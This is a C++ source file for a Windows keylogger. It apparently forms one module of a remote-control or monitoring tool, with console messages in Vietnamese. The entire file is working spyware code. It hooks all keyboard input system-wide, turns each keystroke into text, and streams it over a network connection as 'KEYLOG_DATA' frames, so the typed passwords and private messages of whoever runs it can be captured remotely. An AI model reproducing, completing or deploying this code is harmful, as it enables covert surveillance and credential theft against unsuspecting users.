#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <atomic>
#include "../Network/ServerNetwork.h"
#include "../ThirdParty/json.hpp"

using namespace std;
using json = nlohmann::json;

HHOOK hHook = NULL;
ServerNetwork* g_Server = NULL;
std::atomic<bool> isRunning(false); 
DWORD hookThreadId = 0;

class Keylogger {
private:
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            
            KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = kbd->vkCode;
            string keyName = "";

            if (vkCode == VK_RETURN) keyName = "[Enter]";
            else if (vkCode == VK_BACK) keyName = "[BS]";
            else if (vkCode == VK_SPACE) keyName = " ";
            else if (vkCode == VK_TAB) keyName = "[Tab]";
            else if (vkCode == VK_ESCAPE) keyName = "[Esc]";
            else if (vkCode >= 0x30 && vkCode <= 0x39) { // Số 0-9
                keyName = string(1, (char)vkCode);
            }
            else if (vkCode >= 0x41 && vkCode <= 0x5A) { // Chữ A-Z
                char key = (char)MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
                
                bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                if (!isShift && !isCaps) key = tolower(key);
                if (isShift && isCaps) key = tolower(key);

                keyName = string(1, key);
            }
            else {
                char key = (char)MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
                if (key != 0) keyName = string(1, key);
            }

            if (!keyName.empty() && g_Server != NULL && isRunning) {
                cout << keyName; 

                json j;
                j["type"] = "KEYLOG_DATA";
                j["payload"] = { {"keyStroke", keyName} };
                g_Server->SendFrame(j.dump());
            }
        }
        return CallNextHookEx(hHook, nCode, wParam, lParam);
    }

    static void Loop() {
        hookThreadId = GetCurrentThreadId();
        
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        
        if (hHook == NULL) {
            cout << ">> [LOI] Khong the cai dat Hook!" << endl;
            isRunning = false;
            return;
        }

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (hHook) {
            UnhookWindowsHookEx(hHook);
            hHook = NULL;
        }
        isRunning = false;
    }

public:
    static void Start(ServerNetwork& server) {
        if (isRunning) {
            cout << ">> Keylogger dang chay roi (bo qua lenh Start)." << endl;
            return;
        }

        g_Server = &server;
        isRunning = true;

        thread t(Loop);
        t.detach();
        cout << ">> Keylogger: DA BAT." << endl;
    }

    static void Stop() {
        if (!isRunning) return;

        if (hookThreadId != 0) {
            PostThreadMessage(hookThreadId, WM_QUIT, 0, 0);
        }
        
        Sleep(100);
        isRunning = false;
        g_Server = NULL;
        cout << ">> Keylogger: DA TAT." << endl;
    }
};